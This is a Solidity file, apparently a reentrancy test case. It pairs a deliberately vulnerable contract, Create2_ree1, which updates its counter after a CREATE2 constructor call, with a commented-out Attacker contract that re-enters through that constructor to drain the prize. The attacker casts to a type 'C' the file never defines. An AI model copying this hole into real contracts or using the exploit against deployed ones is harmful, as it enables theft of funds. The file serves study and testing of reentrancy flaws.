// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

contract Create2_ree1 {

    mapping (address => uint) public counters;

    function deploy_and_win(bytes memory initCode, address payable winner, uint salt) public payable returns (address) {
		// to perform a deploy, 0.01 ether is required
		require(msg.value == 0.01 ether);

		// every 10 deploys, a prize of 0.02 ether is sent to the second argument 
		if ((counters[msg.sender] + 1) % 10 == 0) {
			winner.transfer(0.02 ether);	// cannot reenter from here due to low gas
		}

		address addr;
        assembly {
            addr := create2(0, add(initCode, 0x20), mload(initCode), salt)	// can reenter only from here, i.e. from the constructor code
            if iszero(addr) {
                revert(0, 0)
            }
        }

		counters[msg.sender] += 1; // side effect after constructor call makes this vulnerable	
		return addr;
    }

    function getCounter(address a) public view returns (uint) {
        return counters[a];
    }
}

// contract Attacker {
//     bytes private create_auxharmless_initcode;
//     bytes private create_auxharmful_initcode;
//     address payable private victim;

//     uint public stackCount;
//     uint public salt;
//     bool public flag;

//     // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
//     constructor(bytes memory _create_auxharmless_initcode, bytes memory _create_auxharmful_initcode, address payable _victim, uint _salt) payable {    
//         create_auxharmless_initcode = _create_auxharmless_initcode;
//         create_auxharmful_initcode = _create_auxharmful_initcode;
//         victim = _victim;
//         salt = _salt;
//     }

//     function attack() public {
//         C v = C(victim);
//         flag = true;
//         while (flag) {
//             if ( (v.getCounter(address(this)) + 1) % 10 == 0) {
//                 stackCount++;
//                 flag = false;
//                 // attack only every 10 instances, i.e. when some money is transfered
//                 bytes memory auxharmful_initcode = abi.encodePacked(create_auxharmful_initcode, abi.encode(address(this)));
//     	        v.deploy_and_win{value: 0.01 ether}(auxharmful_initcode, payable(address(this)), salt);
//             }
//             else {
//                 v.deploy_and_win{value: 0.01 ether}(create_auxharmless_initcode, payable(address(this)), salt);
//             }
//         }
//     }

//     function reAttack() public {
//         if (victim.balance > 0.02 ether && stackCount < 50) {
//             stackCount++;
//             C v = C(victim);
//             bytes memory auxharmful_initcode = abi.encodePacked(create_auxharmful_initcode, abi.encode(address(this)));
//     	    v.deploy_and_win{value: 0.01 ether}(auxharmful_initcode, payable(address(this)), salt);
//         }
//     }

//     receive() external payable {}
// }

// contract AuxHarmless {
//     constructor() {}
// }

// contract AuxHarmful {
//     constructor(address payable attacker) {
//         Attacker(attacker).reAttack();
//     }
// }

